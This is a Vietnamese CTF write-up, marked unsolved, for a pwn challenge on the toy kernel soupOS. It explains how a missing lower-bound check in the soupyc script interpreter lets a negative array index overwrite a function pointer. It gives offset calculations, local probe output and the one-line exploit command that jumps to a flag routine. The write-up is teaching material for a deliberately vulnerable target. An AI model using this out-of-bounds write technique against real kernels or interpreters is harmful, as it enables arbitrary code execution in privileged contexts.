# soupOS 4: Too Many Cooks - Rev Eng pwn (489 điểm) — ĐANG MỞ

**Cờ:** FLAG4, in ra bởi `serve_the_special()` — **chưa capture được trong phiên này**
· **Điểm:** 489 · **Tác giả:** soup (CDCTF)
**Handout:** `soupos-handout.tar.gz` + `symbols.txt` (dùng chung cả chain)

## Đề bài

"soupyc runs in ring 0. There is a routine nothing ever calls, and your symbol map has its address."

`serve_the_special` (`0x00100990` trong `symbols.txt`) đúng là không có ai gọi trong cả tree:

```c
void serve_the_special(void) {
    vga_set_color(VGA_YELLOW, VGA_BLACK);
    vga_puts("\n  The kitchen is yours: " FLAG4 "\n");
    klog("[chal] serve_the_special reached\n");
}
```

## Phân tích ban đầu

Hai đặc điểm trong `soupyc.c`:

**Điểm 1 — chỉ số âm được phép.** `N_INDEX_SET` chỉ chặn cận trên ở bản thi đấu:

```c
            arr_t *a = &arrays[base.ival];
            int i = as_int(idx);
#ifdef NO_CHALLENGE
            if (i < 0 || i >= a->len) {
#else
            /* CHALLENGE=1: upper bound only, so a negative index writes below
             * the pool. soupyc runs in ring 0, so this is a kernel write from
             * a script. Stage 4 of the CTF chain. */
            if (i >= a->len) {
#endif
                set_err("array index out of range"); return mkival(0);
            }
            a->elems[i] = v;
```

**Điểm 2 — có một con trỏ hàm nằm ngay dưới pool, được gọi khi script kết thúc:**

```c
static struct {
    uint32_t  guard;                /* +0   */
    void    (*after_hook)(void);    /* +4   */
    uint8_t   pad[40];              /* +8   */
    arr_t     pool[MAX_ARRAYS];     /* +48  */
} sc_state;
...
    if (sc_state.after_hook) sc_state.after_hook();     /* soupyc.c:1575 */
```

## Chuỗi khai thác

**Bước 1 - Tính offset cần ghi.** Trên i386: `val_t = {int type; int ival; char sval[48]}` = 56 byte,
`arr_t = {int used; int len; val_t elems[48]}` = 2696 byte, nên `pool[0].elems` ở `sc_state + 56` và

```text
&pool[0].elems[-1] = &sc_state + 56 - 56 = &sc_state + 0
   type -> guard       (+0)
   ival  -> after_hook (+4)      <-- đúng ô cần ghi
   sval  -> pad        (+8)
```

`analysis/layout.c` in ra đúng các con số đó (không cần kernel 32-bit, vì `val_t` không có pointer nên
kích thước giữ nguyên; trên little-endian thì `ival` vẫn rơi vào nửa thấp của con trỏ hàm):

```text
sizeof(val_t)=56 sizeof(arr_t)=2696
guard@0 after_hook@4 pool@48 pool[0].elems@56
&pool[0].elems[-1] - &sc = 0   (want 0 -> type on guard, ival on after_hook)
=> i386 exploit index for handle 0 is i = -1
```

**Bước 2 - Lệnh.** Mảng đầu tiên `let a=[1]` nhận handle 0, phép gán `a[-1]=<addr>` ghi `ival` =
`0x100990 = 1051024` (thập phân vì soupyc không có tiền tố hex) xuống đúng `after_hook`; hook chạy ngay
khi script kết thúc:

```text
cook@soupOS:/> soup -c let a=[1] a[-1]=1051024
```

**Bước 3 - Control đã chạy ở local.** `analysis/stage4_probe.c` link **`soupyc.c` thật** với một hàm
`decoy()` và dùng chính nó làm giá trị ghi:

```text
decoy addr = <địa chỉ in ra bởi chương trình>
soup -c let a=[1] a[-1]=<decoy addr>   ->  DECOY-CALLED
soup -c let a=[1] a[-1]=0              ->  không in gì, soupyc_run trả về bình thường
```

Nghĩa là: (a) một số nguyên gõ trong script thực sự trở thành con trỏ hàm được gọi; (b) hiệu ứng không phải
vô tình — tắt giá trị thì không có gì chạy. Một cấu hình khác (ghi giá trị không map) cho ra SIGSEGV tại
`soupyc_run+617`, tức đúng tại lời gọi hook — cũng là bằng chứng hướng đi trúng, nhưng nó nhắc rằng phải
dùng địa chỉ có thật trong kernel.

## Việc còn lại

Lệnh ở Bước 2 chưa được xác nhận trên VM. Cần chạy lệnh và lưu output trước khi ghi nhận flag. Lỗi `array index out of range` có thể cho biết instance đã chặn chỉ số âm; cần kiểm tra build thực tế.

## Reproduce

```bash
# local: chứng minh lệch bộ nhớ + chứng minh hook chạy
gcc -O0 -w -idirafter "../soupos/src" -o layout.exe analysis/layout.c ../soupos/src/soupyc.c \
     ../soupos/src/vfs.c stubs.c
./layout.exe
gcc -O0 -w -idirafter "../soupos/src" -o stage4.exe analysis/stage4_probe.c ../soupos/src/soupyc.c \
     ../soupos/src/vfs.c stubs.c
./stage4.exe "let a=[1] a[-1]=<decoy addr>"

# trên máy:
soup -c let a=[1] a[-1]=1051024
```
